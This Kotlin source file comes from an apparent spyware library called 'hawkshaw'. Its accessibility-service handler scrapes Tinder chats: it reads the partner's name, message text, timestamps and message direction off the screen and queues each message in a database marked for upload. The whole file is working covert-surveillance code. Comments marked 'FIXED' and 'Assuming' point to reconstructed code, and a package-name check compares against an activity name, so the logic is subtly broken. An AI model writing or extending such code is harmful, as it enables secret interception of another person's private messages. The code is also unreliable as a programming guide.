package com.hawkshaw.library.features.accessibility.socialmedia

import android.os.Build
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.datalayer.room.socialmedia.UnprocessedSocialMediaEntity
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findFirst // Import the extension function
import com.hawkshaw.library.ktextensions.getEmpty
import com.hawkshaw.library.ktextensions.hash
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.ExecutorService

/**
 * Handler for extracting messages from Tinder
 */
object Tinder {
    private const val TINDER_ID = "com.tinder:id"

    /**
     * Process a lambda for extracting messages and inserting the entity
     */
    private fun extractMessagesLambda(entity: UnprocessedSocialMediaEntity) {
        CoroutineScope(Dispatchers.IO).launch {
            HandlerKt.insert(entity) // Assuming HandlerKt.insert is correctly defined and accessible
        }
    }
    
    /**
     * Extract messages from Tinder
     * 
     * @param event The accessibility event
     * @param executor Executor service to process entities asynchronously
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun extractMessages(event: AccessibilityEvent, executor: ExecutorService) {
        // Check if the package name matches Tinder chat activity
        // Note: It's good practice to ensure the packageName matches before processing,
        // but remember that event.packageName refers to the package that generated the event,
        // which might be different from the actual activity in some cases (e.g., system dialogs).
        if (event.packageName != "com.tinder.chat.activity.ChatActivity") {
            return
        }

        // Get the source node
        val source = event.source ?: return

        // Debug output for node tree
        Researcher.print("\n \n \n ") // Assuming Researcher.print and printTree are external utilities
        Researcher.printTree(source)

        // Find the name of the conversation partner
        // FIXED: Call findFirst as an extension function on 'source'
        val nameNode = source.findFirst("$TINDER_ID/textViewName")
        val name = nameNode?.text ?: return

        // Find the chat recycler view containing messages
        // FIXED: Call findFirst as an extension function on 'source'
        val recyclerView = source.findFirst("$TINDER_ID/chat_recycler_view") ?: return

        // Process message bubbles
        var lastTimestamp = ""

        for (i in 0 until recyclerView.childCount) {
            val messageNode = recyclerView.getChild(i) ?: continue

            // Find timestamp and message content
            // FIXED: Call findFirst as an extension function on 'messageNode'
            val timestampNode = messageNode.findFirst("$TINDER_ID/layout_chat_message_timestamp")
            val timestamp = timestampNode?.text

            // FIXED: Call findFirst as an extension function on 'messageNode'
            val messageContentNode = messageNode.findFirst("$TINDER_ID/chatTextMessageContent")
            val messageContent = messageContentNode?.text

            // Skip if there's no timestamp or message content
            if (timestamp == null && messageContent == null) continue

            // Update timestamp if it's present
            if (timestamp != null && timestamp.isNotEmpty()) {
                lastTimestamp = timestamp.getEmpty()
            }

            // Determine message type based on presence of avatar (received message)
            // FIXED: Call findFirst as an extension function on 'messageNode'
            val messageType = if (messageNode.findFirst("$TINDER_ID/chatMessageAvatar") == null) {
                SocialMediaEntity.Type.Sent
            } else {
                SocialMediaEntity.Type.Received
            }

            // Create a unique identifier for this message
            val identifier = "$name-$messageContent-$lastTimestamp-${PackageName.TINDER}"
            val id = identifier.hash() // Assuming hash() is an extension function on String

            // Create the entity to store in the database
            val entity = UnprocessedSocialMediaEntity(
                id = id,
                title = name.getEmpty(),
                status = null, // Status is not extracted in this code
                sender = null, // Sender is not explicitly extracted here, assuming 'name' is the conversation partner, not the individual sender of a message.
                message = messageContent.getEmpty(),
                type = messageType,
                application = PackageName.TINDER,
                timeString = lastTimestamp,
                uploaded = false
            )

            // Process the entity asynchronously using the provided executor
            executor.execute { extractMessagesLambda(entity) }
        }
    }
}
